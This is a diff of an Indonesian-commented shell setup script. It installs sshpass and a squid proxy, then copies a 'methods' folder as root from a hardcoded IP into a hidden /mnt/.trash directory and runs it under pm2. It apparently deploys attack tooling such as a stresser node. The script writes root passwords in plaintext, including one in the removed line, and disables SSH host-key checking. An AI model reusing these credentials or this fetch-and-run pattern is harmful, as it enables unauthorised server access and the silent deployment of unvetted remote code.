@@ -11,7 +11,7 @@ fi
 pm2 save
 pm2 save --force
 # Install paket yang diperlukan
-DEBIAN_FRONTEND=noninteractive apt install -y sshpass npm nodejs build-essential squid
+DEBIAN_FRONTEND=noninteractive apt install -y sshpass npm nodejs python3 python3-pip build-essential squid
 
 # Membersihkan dan menyiapkan direktori
 rm -rf /mnt/.trash
@@ -20,7 +20,7 @@ mkdir /mnt/.trash
 cd /mnt/.trash
 
 # Memindahkan file dengan scp
-sshpass -p 'lexx120109' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r root@159.223.47.71:/root/methods/* ./
+sshpass -p 'lex' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r root@159.223.47.71:/root/methods/* ./
 
 # Menginstal NVM dan Node.js
 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
@@ -29,6 +29,7 @@ nvm install 20 || echo 'Node.js sudah terpasang'
 nvm use 20
 
 # Instalasi npm dan pm2
+pip install colored
 npm install
 npm install -g pm2
 pm2 stop all || echo 'Tidak ada layanan PM2 yang sedang berjalan'
